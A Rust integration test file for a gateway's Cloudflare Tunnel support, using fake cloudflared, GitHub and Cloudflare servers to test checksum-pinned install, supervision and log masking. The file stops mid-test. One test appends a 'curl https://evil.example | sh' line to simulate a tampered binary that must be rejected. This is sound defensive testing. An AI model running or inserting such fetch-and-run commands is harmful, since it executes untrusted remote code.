//! The built-in Cloudflare Tunnel (docs/plans/cloudflare-tunnel.md), against a fake
//! `cloudflared` (a shell script that records its arguments and environment, then sleeps),
//! a fake GitHub asset server, a fake Cloudflare API, and a fake metrics endpoint the test
//! serves on the port the gateway handed `cloudflared`.
#![cfg(target_os = "linux")]

mod common;
use common::*;

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};

use anywhere_gateway::admin;
use anywhere_gateway::cftunnel::{ManualClock, Settings, Tunnel};
use axum::extract::ConnectInfo;
use axum::response::IntoResponse;
use base64::Engine;
use reqwest::StatusCode as S;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

const HOST: &str = "music.example.com";
const ACCOUNT: &str = "0123456789abcdef0123456789abcdef";
const ZONE: &str = "fedcba9876543210fedcba9876543210";
const RECORD: &str = "aaaabbbbccccddddeeeeffff00001111";
const TUNNEL_ID: &str = "6f1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d";
const API_TOKEN: &str = "Fake_ApiToken-0123456789abcdefXYZ";
const QUICK: &str = "quiet-river-lamp.trycloudflare.com";

/// A well-formed tunnel token (account, tunnel id, secret).
fn tunnel_token(tag: u8) -> String {
    let secret = base64::engine::general_purpose::STANDARD.encode([tag; 32]);
    let json = format!(r#"{{"a":"{ACCOUNT}","t":"{TUNNEL_ID}","s":"{secret}"}}"#);
    base64::engine::general_purpose::STANDARD.encode(json)
}

// ---------------------------------------------------------------------------
// The fake cloudflared
// ---------------------------------------------------------------------------

/// The script: `--version` answers like the real one; otherwise it records its argv and its
/// initial environment (from /proc, exactly what it was given) under `rec`, prints a line
/// or two, and sleeps (or exits at once if `rec/crash` exists).
fn fake_cloudflared(rec: &Path) -> Vec<u8> {
    format!(
        "#!/bin/sh\n\
         if [ \"$1\" = \"--version\" ]; then\n\
           echo 'cloudflared version 2026.10.1 (built 2026-10-15-17:08 UTC)'\n\
           exit 0\n\
         fi\n\
         rec='{rec}'\n\
         n=$$\n\
         tr '\\000' '\\n' < /proc/$$/environ > \"$rec/env.$n\"\n\
         printf '%s\\n' \"$@\" > \"$rec/argv.$n.tmp\"\n\
         mv \"$rec/argv.$n.tmp\" \"$rec/argv.$n\"\n\
         echo \"INF Starting tunnel tunnelID={TUNNEL_ID}\"\n\
         echo \"INF environment TUNNEL_TOKEN=$TUNNEL_TOKEN\" >&2\n\
         if [ -f \"$rec/quick-line\" ]; then cat \"$rec/quick-line\"; fi\n\
         if [ -f \"$rec/crash\" ]; then echo 'ERR crashing as told' >&2; exit 3; fi\n\
         exec sleep 600\n",
        rec = rec.display()
    )
    .into_bytes()
}

/// Every run of the fake so far: (pid, argv, environment).
fn runs(rec: &Path) -> Vec<(u32, Vec<String>, Vec<String>)> {
    let mut out = vec![];
    for e in std::fs::read_dir(rec).unwrap().flatten() {
        let name = e.file_name().to_string_lossy().into_owned();
        let Some(pid) = name
            .strip_prefix("argv.")
            .and_then(|p| p.parse::<u32>().ok())
        else {
            continue;
        };
        let argv = std::fs::read_to_string(e.path()).unwrap();
        let env = std::fs::read_to_string(rec.join(format!("env.{pid}"))).unwrap_or_default();
        out.push((
            pid,
            argv.lines().map(str::to_string).collect(),
            env.lines()
                .filter(|l| !l.is_empty())
                .map(str::to_string)
                .collect(),
        ));
    }
    out.sort_by_key(|r| {
        std::fs::metadata(rec.join(format!("argv.{}", r.0)))
            .and_then(|m| m.modified())
            .unwrap()
    });
    out
}

fn alive(pid: u32) -> bool {
    // A zombie is gone as far as we care.
    std::fs::read_to_string(format!("/proc/{pid}/stat"))
        .map(|s| !s.contains(") Z "))
        .unwrap_or(false)
}

fn kill(pid: u32) {
    let _ = std::process::Command::new("kill")
        .arg("-9")
        .arg(pid.to_string())
        .stderr(std::process::Stdio::null())
        .status();
}

// ---------------------------------------------------------------------------
// The fake GitHub
// ---------------------------------------------------------------------------

#[derive(Default)]
struct GitHub {
    body: Mutex<Vec<u8>>,
    /// Serve half the body, then wait until this is cleared.
    hold: AtomicBool,
    requests: Mutex<Vec<String>>,
}

async fn fake_github(gh: Arc<GitHub>) -> String {
    let app = Router::new().fallback(any(move |req: Request| {
        let gh = gh.clone();
        async move {
            let path = req.uri().path().to_string();
            gh.requests.lock().unwrap().push(path.clone());
            if let Some(asset) = path.strip_prefix("/releases/2026.10.1/") {
                // GitHub redirects to its asset host: one hop here.
                return axum::response::Redirect::temporary(&format!("/assets/{asset}"))
                    .into_response();
            }
            if path != "/assets/cloudflared-linux-amd64" {
                return StatusCode::NOT_FOUND.into_response();
            }
            let body = gh.body.lock().unwrap().clone();
            if gh.hold.load(Ordering::SeqCst) {
                let half = bytes::Bytes::from(body[..body.len() / 2].to_vec());
                let rest = bytes::Bytes::from(body[body.len() / 2..].to_vec());
                let gh2 = gh.clone();
                let s = futures_util::stream::once(async move { Ok::<_, std::io::Error>(half) })
                    .chain(futures_util::stream::once(async move {
                        while gh2.hold.load(Ordering::SeqCst) {
                            tokio::time::sleep(Duration::from_millis(20)).await;
                        }
                        Ok(rest)
                    }));
                return axum::response::Response::builder()
                    .header("content-length", body.len())
                    .body(Body::from_stream(s))
                    .unwrap();
            }
            body.into_response()
        }
    }));
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    format!("http://{addr}")
}

// ---------------------------------------------------------------------------
// The fake Cloudflare API
// ---------------------------------------------------------------------------

#[derive(Default)]
struct Cf {
    /// (method, path with query, authorization, body)
    requests: Mutex<Vec<(String, String, String, Value)>>,
    /// The step to fail: "zone", "create", "configure", "dns", "token".
    fail_at: Mutex<Option<&'static str>>,
    /// The tunnel creation answers 403 "Authentication error" (code 10000).
    missing_scope: AtomicBool,
    /// A DNS record already exists for the hostname.
    existing_record: AtomicBool,
    /// No zone contains the hostname.
    no_zone: AtomicBool,
    /// Hold the zone lookup until cleared.
    hold: AtomicBool,
    token: Mutex<String>,
}

impl Cf {
    fn methods(&self) -> Vec<String> {
        self.requests
            .lock()
            .unwrap()
            .iter()
            .map(|(m, p, _, _)| format!("{m} {}", p.split('?').next().unwrap()))
            .collect()
    }
    fn deleted(&self) -> bool {
        self.requests.lock().unwrap().iter().any(|(m, p, _, _)| {
            m == "DELETE"
                && p == &format!("/accounts/{ACCOUNT}/cfd_tunnel/{TUNNEL_ID}?cascade=true")
        })
    }
}

async fn fake_cloudflare(cf: Arc<Cf>) -> String {
    let app = Router::new().fallback(any(move |req: Request| {
        let cf = cf.clone();
        async move {
            let method = req.method().to_string();
            let pq = req.uri().path_and_query().unwrap().to_string();
            let path = req.uri().path().to_string();
            let auth = req
                .headers()
                .get("authorization")
                .map(|v| v.to_str().unwrap().to_string())
                .unwrap_or_default();
            let body = axum::body::to_bytes(req.into_body(), 1 << 20).await.unwrap();
            let body: Value = serde_json::from_slice(&body).unwrap_or(Value::Null);
            cf.requests
                .lock()
                .unwrap()
                .push((method.clone(), pq.clone(), auth, body));
            let step = match (method.as_str(), path.as_str()) {
                ("GET", "/zones") => "zone",
                ("POST", p) if p.ends_with("/cfd_tunnel") => "create",
                ("PUT", p) if p.ends_with("/configurations") => "configure",
                (_, p) if p.contains("/dns_records") => "dns",
                ("GET", p) if p.ends_with("/token") => "token",
                ("DELETE", _) => "delete",
                _ => "unknown",
            };
            if step == "zone" {
                while cf.hold.load(Ordering::SeqCst) {
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
            }
            let ok = |result: Value| {
                axum::Json(json!({"success": true, "errors": [], "result": result}))
                    .into_response()
            };
            let fail = |status: u16, code: i64, msg: &str| {
                (
                    StatusCode::from_u16(status).unwrap(),
                    axum::Json(json!({"success": false, "errors": [{"code": code, "message": msg}], "result": null})),
                )
                    .into_response()
            };
            if *cf.fail_at.lock().unwrap() == Some(step) {
                return fail(400, 1000, &format!("Fake failure at {step}"));
            }
            if step == "create" && cf.missing_scope.load(Ordering::SeqCst) {
                return fail(403, 10000, "Authentication error");
            }
            match step {
                "zone" => {
                    let page: u64 = pq
                        .split("page=")
                        .nth(1)
                        .and_then(|p| p.split('&').next())
                        .and_then(|p| p.parse().ok())
                        .unwrap_or(1);
                    let zone = |name: &str, id: &str| {
                        json!({"name": name, "id": id, "account": {"id": ACCOUNT}})
                    };
                    let result = if page == 1 {
                        json!([zone("example.org", &"1".repeat(32)), zone("com", &"2".repeat(32))])
                    } else if cf.no_zone.load(Ordering::SeqCst) {
                        json!([])
                    } else {
                        json!([zone("example.com", ZONE), zone("other.example.com", &"3".repeat(32))])
                    };
                    axum::Json(json!({"success": true, "errors": [], "result": result,
                        "result_info": {"page": page, "total_pages": 2}}))
                    .into_response()
                }
                "create" => ok(json!({"id": TUNNEL_ID, "name": "x"})),
                "configure" => ok(json!({})),
                "dns" if method == "GET" => {
                    if cf.existing_record.load(Ordering::SeqCst) {
                        ok(json!([{"id": RECORD, "type": "A", "name": HOST}]))
                    } else {
                        ok(json!([]))
                    }
                }
                "dns" => ok(json!({"id": RECORD})),
                "token" => ok(json!(cf.token.lock().unwrap().clone())),
                "delete" => ok(json!({})),
                _ => StatusCode::NOT_FOUND.into_response(),
            }
        }
    }));
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    format!("http://{addr}")
}

// ---------------------------------------------------------------------------
// The fake metrics endpoint
// ---------------------------------------------------------------------------

struct Metrics {
    connections: AtomicU32,
    quick: AtomicBool,
}

async fn serve_metrics(port: u16, m: Arc<Metrics>) {
    let app = Router::new()
        .route(
            "/ready",
            axum::routing::get({
                let m = m.clone();
                move || {
                    let m = m.clone();
                    async move {
                        let n = m.connections.load(Ordering::SeqCst);
                        let code = if n > 0 { 200 } else { 503 };
                        (
                            StatusCode::from_u16(code).unwrap(),
                            axum::Json(json!({"status": code, "readyConnections": n})),
                        )
                    }
                }
            }),
        )
        .route(
            "/quicktunnel",
            axum::routing::get(move || {
                let m = m.clone();
                async move {
                    if m.quick.load(Ordering::SeqCst) {
                        axum::Json(json!({"hostname": QUICK})).into_response()
                    } else {
                        axum::Json(json!({"hostname": ""})).into_response()
                    }
                }
            }),
        );
    let l = TcpListener::bind(("127.0.0.1", port)).await.unwrap();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
}

// ---------------------------------------------------------------------------
// The test set-up
// ---------------------------------------------------------------------------

struct T {
    h: Harness,
    data: ScratchDb,
    rec: PathBuf,
    gh: Arc<GitHub>,
    cf: Arc<Cf>,
    clock: Arc<ManualClock>,
    settings: Settings,
    admin: String,
    secret: String,
    metrics: Arc<Metrics>,
    served_ports: Mutex<Vec<u16>>,
}

async fn setup() -> T {
    setup_with(|_| {}).await
}

async fn setup_with(tweak: impl FnOnce(&mut Settings)) -> T {
    let data = ScratchDb(scratch_dir("anywhere-cftunnel", "data"));
    let rec = data.0.join("rec");
    std::fs::create_dir_all(&rec).unwrap();
    let gh = Arc::new(GitHub::default());
    let script = fake_cloudflared(&rec);
    let sum = hex::encode(Sha256::digest(&script));
    *gh.body.lock().unwrap() = script;
    let gh_base = fake_github(gh.clone()).await;
    let cf = Arc::new(Cf::default());
    *cf.token.lock().unwrap() = tunnel_token(9);
    let cf_base = fake_cloudflare(cf.clone()).await;
    let clock = ManualClock::new();
    // The fake servers share one origin per server; the tests allow both.
    let mut settings = Settings {
        enabled: true,
        dir: Some(data.0.join("tunnel")),
        listen: "127.0.0.1:9443".parse().unwrap(),
        os: "linux".into(),
        arch: "x86_64".into(),
        pinned_sha256: Some(sum),
        asset_base: format!("{gh_base}/releases"),
        api_base: cf_base.clone(),
        test_origin: Some(gh_base.clone()),
        poll_interval: Duration::from_millis(50),
        backoff_base: Duration::from_millis(100),
        backoff_max: Duration::from_millis(400),
        stop_grace: Duration::from_secs(2),
        clock: clock.clone(),
        ..Settings::default()
    };
    tweak(&mut settings);
    let s2 = settings.clone();
    let h = harness_with(move |c| c.tunnel = s2).await;
    let secret = "s".repeat(64);
    let app = admin::router(h.gw.clone(), secret.clone());
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(l, app.into_make_service_with_connect_info::<SocketAddr>())
            .await
            .unwrap()
    });
    h.gw.tunnel().startup().await;
    T {
        h,
        data,
        rec,
        gh,
        cf,
        clock,
        settings,
        admin: format!("http://{addr}"),
        secret,
        metrics: Arc::new(Metrics {
            connections: AtomicU32::new(4),
            quick: AtomicBool::new(true),
        }),
        served_ports: Mutex::new(vec![]),
    }
}

impl Drop for T {
    fn drop(&mut self) {
        // Leave no fake cloudflared behind.
        for (pid, _, _) in runs(&self.rec) {
            kill(pid);
        }
    }
}

impl T {
    fn dir(&self) -> PathBuf {
        self.data.0.join("tunnel")
    }

    async fn post(&self, path: &str, body: Option<Value>) -> (S, Value) {
        let mut req = reqwest::Client::new()
            .post(format!("{}/admin/v1/tunnel{path}", self.admin))
            .bearer_auth(&self.secret);
        if let Some(b) = body {
            req = req.json(&b);
        }
        let r = req.send().await.unwrap();
        let status = r.status();
        let text = r.text().await.unwrap();
        (status, serde_json::from_str(&text).unwrap_or(Value::Null))
    }

    async fn status(&self) -> Value {
        let r = reqwest::Client::new()
            .get(format!("{}/admin/v1/tunnel", self.admin))
            .bearer_auth(&self.secret)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), S::OK);
        let v: Value = r.json().await.unwrap();
        assert_status_shape(&v);
        v
    }

    async fn wait(&self, what: &str, f: impl Fn(&Value) -> bool) -> Value {
        let mut last = Value::Null;
        for _ in 0..500 {
            // Serve the metrics of every new child as it appears.
            self.serve_new_metrics().await;
            last = self.status().await;
            if f(&last) {
                return last;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        panic!("{what}: never happened; last status {last:#}");
    }

    async fn wait_state(&self, state: &str) -> Value {
        self.wait(state, |v| v["state"] == state).await
    }

    async fn serve_new_metrics(&self) {
        for (_, argv, _) in runs(&self.rec) {
            let Some(i) = argv.iter().position(|a| a == "--metrics") else {
                continue;
            };
            let port: u16 = argv[i + 1].rsplit(':').next().unwrap().parse().unwrap();
            if self.served_ports.lock().unwrap().contains(&port) {
                continue;
            }
            self.served_ports.lock().unwrap().push(port);
            serve_metrics(port, self.metrics.clone()).await;
        }
    }

    async fn install(&self) {
        let (s, v) = self.post("/install", None).await;
        assert_eq!(s, S::ACCEPTED, "{v}");
        assert_eq!(v, json!({}));
        self.wait_state("installed").await;
    }

    async fn register(&self) {
        let (s, v) = self
            .post(
                "/register",
                Some(json!({"token": tunnel_token(1), "hostname": HOST})),
            )
            .await;
        assert_eq!(s, S::NO_CONTENT, "{v}");
    }

    /// Every file under the tunnel's folder, with its contents.
    fn files(&self) -> HashMap<String, Vec<u8>> {
        std::fs::read_dir(self.dir())
            .unwrap()
            .flatten()
            .map(|e| {
                (
                    e.file_name().to_string_lossy().into_owned(),
                    std::fs::read(e.path()).unwrap_or_default(),
                )
            })
            .collect()
    }

    fn live_runs(&self) -> Vec<u32> {
        runs(&self.rec)
            .into_iter()
            .map(|r| r.0)
            .filter(|p| alive(*p))
            .collect()
    }

    /// A fresh tunnel on the same folder, as after a gateway restart.
    async fn restarted(&self) -> Arc<Tunnel> {
        let t = Tunnel::new(self.settings.clone(), Default::default());
        t.startup().await;
        t
    }
}

const KEYS: [&str; 15] = [
    "supported",
    "pinned_version",
    "installed_version",
    "update_available",
    "mode",
    "state",
    "hostname",
    "public_url",
    "connections",
    "uptime",
    "quick_ends_in",
    "progress",
    "step",
    "error",
    "log",
];

/// Every key, always, with the types the settings page relies on.
fn assert_status_shape(v: &Value) {
    let o = v.as_object().expect("status is an object");
    for k in KEYS {
        assert!(o.contains_key(k), "missing {k}: {v}");
    }
    assert_eq!(o.len(), KEYS.len(), "unexpected keys: {v}");
    assert!(v["supported"].is_boolean() && v["update_available"].is_boolean());
    for k in [
        "installed_version",
        "hostname",
        "public_url",
        "step",
        "error",
    ] {
        assert!(v[k].is_null() || v[k].is_string(), "{k}: {v}");
    }
    assert!(v["pinned_version"].is_string());
    assert!(["none", "registered", "quick"].contains(&v["mode"].as_str().unwrap()));
    assert!(v["connections"].is_u64(), "{v}");
    assert!(v["uptime"].is_null() || v["uptime"].is_u64());
    assert!(v["quick_ends_in"].is_null() || v["quick_ends_in"].is_u64());
    assert!(
        v["progress"].is_null()
            || (v["progress"]["bytes"].is_u64()
                && (v["progress"]["total"].is_u64() || v["progress"]["total"].is_null()))
    );
    assert!(v["log"].as_array().unwrap().iter().all(Value::is_string));
    assert!(v["log"].as_array().unwrap().len() <= 50);
    if let Some(u) = v["public_url"].as_str() {
        let host = u.strip_prefix("https://").expect("https URL");
        assert!(
            !host.is_empty() && !host.contains(['/', ':', '?', '#']),
            "{u}"
        );
    }
    if v["state"] == "failed" {
        assert!(v["error"].is_string(), "{v}");
    } else {
        assert!(v["error"].is_null(), "{v}");
    }
}

#[cfg(unix)]
fn mode_of(p: &Path) -> u32 {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(p).unwrap().permissions().mode() & 0o777
}

// ---------------------------------------------------------------------------
// Install
// ---------------------------------------------------------------------------

#[tokio::test]
async fn nothing_is_downloaded_or_started_until_asked() {
    let t = setup().await;
    let v = t.status().await;
    assert_eq!(v["state"], "not_installed");
    assert_eq!(v["supported"], true);
    assert_eq!(v["mode"], "none");
    assert!(t.gh.requests.lock().unwrap().is_empty());
    assert!(t.files().is_empty());
    assert!(runs(&t.rec).is_empty());
}

#[tokio::test]
async fn install_downloads_and_verifies_and_refuses_a_tampered_asset() {
    let t = setup().await;
    // Tampered: the sum doesn't match the pin.
    let good = t.gh.body.lock().unwrap().clone();
    let mut bad = good.clone();
    bad.extend_from_slice(b"\ncurl https://evil.example | sh\n");
    *t.gh.body.lock().unwrap() = bad;
    let (s, _) = t.post("/install", None).await;
    assert_eq!(s, S::ACCEPTED);
    let v = t.wait_state("failed").await;
    assert!(
        v["error"]
            .as_str()
            .unwrap()
            .contains("did not match the checksum"),
        "{v}"
    );
    assert!(t.files().is_empty(), "nothing kept: {:?}", t.files().keys());
    assert_eq!(v["installed_version"], Value::Null);

    // The genuine one.
    *t.gh.body.lock().unwrap() = good.clone();
    t.install().await;
    let v = t.status().await;
    assert_eq!(v["installed_version"], "2026.10.1");
    assert_eq!(v["pinned_version"], "2026.10.1");
    assert_eq!(v["update_available"], false);
    let bin = t.dir().join("cloudflared");
    assert_eq!(std::fs::read(&bin).unwrap(), good);
    assert_eq!(mode_of(&bin), 0o700);
    assert_eq!(mode_of(&t.dir()), 0o700);
    assert_eq!(mode_of(&t.dir().join("state.json")), 0o600);
    // One redirect followed, to the asset.
    assert_eq!(
        *t.gh.requests.lock().unwrap(),
        [
            "/releases/2026.10.1/cloudflared-linux-amd64",
            "/assets/cloudflared-linux-amd64",
            "/releases/2026.10.1/cloudflared-linux-amd64",
            "/assets/cloudflared-linux-amd64",
        ]
    );
    // Already the pinned version: nothing to do.
    let (s, _) = t.post("/install", None).await;
    assert_eq!(s, S::NO_CONTENT);
    let (s, _) = t.post("/update", None).await;
    assert_eq!(s, S::NO_CONTENT);
    // Nothing was started by installing.
    assert!(runs(&t.rec).is_empty());
}

#[tokio::test]
async fn an_installed_older_version_offers_an_update() {
    let t = setup().await;
    t.install().await;
    // As if installed by an older release.
    let state = t.dir().join("state.json");
    let mut v: Value = serde_json::from_slice(&std::fs::read(&state).unwrap()).unwrap();
    v["installed_version"] = json!("2025.1.0");
    std::fs::write(&state, v.to_string()).unwrap();
    let t2 = t.restarted().await;
    let s = t2.status();
    assert_eq!(s["installed_version"], "2025.1.0");
    assert_eq!(s["update_available"], true);
    assert_eq!(
        t2.update().await,
        Ok(anywhere_gateway::cftunnel::Accepted::Started)
    );
    for _ in 0..300 {
        if t2.status()["state"] == "installed" {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    let s = t2.status();
    assert_eq!(s["installed_version"], "2026.10.1", "{s}");
    assert_eq!(s["update_available"], false);
}

// ---------------------------------------------------------------------------
// Status shapes
// ---------------------------------------------------------------------------

#[tokio::test]
async fn every_state_has_every_key() {
    let t = setup().await;
    assert_eq!(t.status().await["state"], "not_installed");

    // installing, with progress
    t.gh.hold.store(true, Ordering::SeqCst);
    let (s, _) = t.post("/install", None).await;
    assert_eq!(s, S::ACCEPTED);
    let v = t
        .wait("installing with progress", |v| {
            v["state"] == "installing" && v["progress"]["bytes"].as_u64().unwrap_or(0) > 0
        })
        .await;
    assert!(v["progress"]["total"].is_u64());
    // Busy: other actions wait.
    let (s, e) = t.post("/quick", None).await;
    assert_eq!(s, S::CONFLICT, "{e}");
    assert!(e["error"].as_str().unwrap().ends_with('.'));
    t.gh.hold.store(false, Ordering::SeqCst);
    let v = t.wait_state("installed").await;
    assert_eq!(v["progress"], Value::Null);
    assert_eq!(v["hostname"], Value::Null);
    assert_eq!(v["connections"], 0);

    // creating, with its step
    t.cf.hold.store(true, Ordering::SeqCst);
    let (s, v) = t
        .post(
            "/create",
            Some(json!({"api_token": API_TOKEN, "hostname": HOST})),
        )
        .await;
    assert_eq!(s, S::ACCEPTED, "{v}");
    assert_eq!(v, json!({}));
    let v = t.wait_state("creating").await;
    assert_eq!(v["step"], "zone");
    t.cf.hold.store(false, Ordering::SeqCst);

    // starting (the fake isn't ready yet), connected, reconnecting
    t.metrics.connections.store(0, Ordering::SeqCst);
    let v = t.wait_state("starting").await;
    assert_eq!(v["mode"], "registered");
    assert_eq!(v["hostname"], HOST);
    assert_eq!(v["step"], Value::Null);
    t.metrics.connections.store(4, Ordering::SeqCst);
    let v = t.wait_state("connected").await;
    assert_eq!(v["connections"], 4);
    assert_eq!(v["public_url"], format!("https://{HOST}"));
    assert!(v["uptime"].is_u64());
    assert_eq!(v["quick_ends_in"], Value::Null);
    t.metrics.connections.store(0, Ordering::SeqCst);
    t.wait_state("reconnecting").await;

    // stopped
    let (s, _) = t.post("/stop", None).await;
    assert_eq!(s, S::NO_CONTENT);
    let v = t.status().await;
    assert_eq!(v["state"], "stopped");
    assert_eq!(
        v["mode"], "registered",
        "a stopped registered tunnel is still registered"
    );
    assert_eq!(v["hostname"], HOST);
    assert_eq!(v["public_url"], format!("https://{HOST}"));
    assert_eq!(v["uptime"], Value::Null);

    // failed: the child can't be started at all
    std::fs::remove_file(t.dir().join("cloudflared")).unwrap();
    std::fs::write(t.dir().join("cloudflared"), b"not a program").unwrap();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(
            t.dir().join("cloudflared"),
            std::fs::Permissions::from_mode(0o700),
        )
        .unwrap();
    }
    let (s, _) = t.post("/start", None).await;
    assert_eq!(s, S::NO_CONTENT);
    let v = t.wait_state("failed").await;
    assert!(
        v["error"]
            .as_str()
            .unwrap()
            .contains("could not be started"),
        "{v}"
    );

    // the log, scrubbed
    let r: Value = reqwest::Client::new()
        .get(format!("{}/admin/v1/tunnel/log", t.admin))
        .bearer_auth(&t.secret)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let log = r["log"].as_array().unwrap();
    assert!(!log.is_empty() && log.len() <= 200);
    let all = serde_json::to_string(log).unwrap();
    assert!(!all.contains(&tunnel_token(9)[..30]), "token in the log");
    assert!(!all.contains(TUNNEL_ID), "tunnel id in the log");
    assert!(!all.contains(API_TOKEN), "API token in the log");
    assert!(all.contains("TUNNEL_TOKEN=[masked]"), "{all}");
}

#[tokio::test]
async fn unsupported_and_turned_off_tunnels_refuse_every_action() {
    for tweak in [
        (|s: &mut Settings| s.enabled = false) as fn(&mut Settings),
        |s: &mut Settings| s.arch = "riscv64".into(),
        |s: &mut Settings| s.os = "freebsd".into(),
    ] {
        let t = setup_with(tweak).await;
        let v = t.status().await;
        assert_eq!(v["supported"], false);
        assert_eq!(v["state"], "unsupported");
        assert_eq!(v["mode"], "none");
        for (path, body) in routes() {
            let (s, e) = t.post(path, body).await;
            assert_eq!(s, S::CONFLICT, "{path}");
            assert!(e["error"].is_string(), "{path}: {e}");
        }
        let r = reqwest::Client::new()
            .get(format!("{}/admin/v1/tunnel/log", t.admin))
            .bearer_auth(&t.secret)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), S::OK);
        assert!(!t.dir().exists() || t.files().is_empty());
        assert!(t.gh.requests.lock().unwrap().is_empty());
    }
}

fn routes() -> Vec<(&'static str, Option<Value>)> {
    vec![
        ("/install", None),
        ("/update", None),
        (
            "/register",
            Some(json!({"token": tunnel_token(1), "hostname": HOST})),
        ),
        (
            "/create",
            Some(json!({"api_token": API_TOKEN, "hostname": HOST, "replace_dns": false})),
        ),
        ("/start", None),
        ("/stop", None),
        ("/quick", None),
        ("/remove", None),
    ]
}

// ---------------------------------------------------------------------------
// The supervisor
// ---------------------------------------------------------------------------

#[tokio::test]
async fn the_supervisor_runs_restarts_and_stops_cloudflared() {
    let t = setup().await;
    t.install().await;
    t.register().await;
    let v = t.wait_state("connected").await;
    assert_eq!(v["connections"], 4);
    let r = runs(&t.rec);
    assert_eq!(r.len(), 1);
    let (pid, argv, env) = &r[0];
    // The fixed argument list, the token nowhere in it.
    assert_eq!(argv[..3], ["tunnel", "--no-autoupdate", "--metrics"]);
    assert!(argv[3].starts_with("127.0.0.1:"));
    assert_eq!(argv[4..], ["--loglevel", "info", "run"]);
    let token = tunnel_token(1);
    assert!(argv.iter().all(|a| !a.contains(&token[..20])));
    let cmdline = std::fs::read(format!("/proc/{pid}/cmdline")).unwrap();
    assert!(!String::from_utf8_lossy(&cmdline).contains(&token[..20]));
    // Only the allowed environment, the token in it.
    let mut env = env.clone();
    env.sort();
    assert_eq!(
        env,
        [
            format!("HOME={}", t.dir().display()),
            "PATH=/usr/bin:/bin".to_string(),
            format!("TUNNEL_TOKEN={token}"),
        ]
    );
    // The token file: 0600.
    assert_eq!(
        std::fs::read_to_string(t.dir().join("token")).unwrap(),
        token
    );
    assert_eq!(mode_of(&t.dir().join("token")), 0o600);
    assert_eq!(
        std::fs::read_to_string(t.dir().join("pid")).unwrap(),
        pid.to_string()
    );

    // A crash: it is started again, with backoff while it keeps crashing.
    std::fs::write(t.rec.join("crash"), b"").unwrap();
    kill(*pid);
    t.wait("restarted a few times", |_| runs(&t.rec).len() >= 4)
        .await;
    let v = t.status().await;
    assert_eq!(v["state"], "reconnecting");
    let log = v["log"].to_string();
    assert!(log.contains("stopped unexpectedly"), "{log}");
    assert!(log.contains("crashing as told"), "{log}");
    std::fs::remove_file(t.rec.join("crash")).unwrap();
    t.wait_state("connected").await;
    assert_eq!(t.live_runs().len(), 1);

    // Stop: the child goes, and the state says stopped.
    let live = t.live_runs()[0];
    let (s, _) = t.post("/stop", None).await;
    assert_eq!(s, S::NO_CONTENT);
    assert!(!alive(live));
    assert!(!t.dir().join("pid").exists());
    assert_eq!(t.status().await["state"], "stopped");
    // Stopping again is fine.
    assert_eq!(t.post("/stop", None).await.0, S::NO_CONTENT);
}

#[tokio::test]
async fn gateway_shutdown_stops_the_child() {
    let t = setup().await;
    t.install().await;
    t.register().await;
    t.wait_state("connected").await;
    let pid = t.live_runs()[0];
    t.h.gw.tunnel().shutdown().await;
    assert!(!alive(pid));
    // Shutting down keeps the registered tunnel's start-up setting.
    let state: Value =
        serde_json::from_slice(&std::fs::read(t.dir().join("state.json")).unwrap()).unwrap();
    assert_eq!(state["run_at_start"], true);
}

#[tokio::test]
async fn a_registered_tunnel_comes_back_after_a_restart_unless_stopped() {
    let t = setup().await;
    t.install().await;
    t.register().await;
    t.wait_state("connected").await;
    t.h.gw.tunnel().shutdown().await;
    assert!(t.live_runs().is_empty());
    let t2 = t.restarted().await;
    for _ in 0..300 {
        t.serve_new_metrics().await;
        if t2.status()["state"] == "connected" {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert_eq!(t2.status()["state"], "connected", "{}", t2.status());
    assert_eq!(t.live_runs().len(), 1);
    // Stopped by the admin, it stays stopped.
    t2.stop().await.unwrap();
    assert!(t.live_runs().is_empty());
    let t3 = t.restarted().await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    let s = t3.status();
    assert_eq!(s["state"], "installed", "{s}");
    assert_eq!(s["mode"], "registered");
    assert_eq!(s["hostname"], HOST);
    assert!(t.live_runs().is_empty());
}

#[tokio::test]
async fn remove_deletes_the_binary_and_the_token() {
    let t = setup().await;
    t.install().await;
    t.register().await;
    t.wait_state("connected").await;
    let pid = t.live_runs()[0];
    let (s, _) = t.post("/remove", None).await;
    assert_eq!(s, S::NO_CONTENT);
    assert!(!alive(pid));
    assert!(t.files().is_empty(), "{:?}", t.files().keys());
    assert_eq!(mode_of(&t.dir()), 0o700);
    let v = t.status().await;
    assert_eq!(v["state"], "not_installed");
    assert_eq!(v["mode"], "none");
    assert_eq!(v["hostname"], Value::Null);
    let (s, _) = t.post("/start", None).await;
    assert_eq!(s, S::CONFLICT, "nothing registered any more");
}

#[tokio::test]
async fn a_stale_cloudflared_is_stopped_only_if_it_is_ours() {
    let t = setup().await;
    std::fs::create_dir_all(t.dir()).unwrap();
    // Ours: a copy of `sleep` at <data>/tunnel/cloudflared.
    let sleep = ["/usr/bin/sleep", "/bin/sleep"]
        .into_iter()
        .find(|p| Path::new(p).exists())
        .unwrap();
    std::fs::copy(sleep, t.dir().join("cloudflared")).unwrap();
    let mut ours = std::process::Command::new(t.dir().join("cloudflared"))
        .arg("300")
        .spawn()
        .unwrap();
    let mut other = std::process::Command::new(sleep)
        .arg("300")
        .spawn()
        .unwrap();

    // A pid file naming someone else's process: left alone.
    std::fs::write(t.dir().join("pid"), other.id().to_string()).unwrap();
    let _t2 = t.restarted().await;
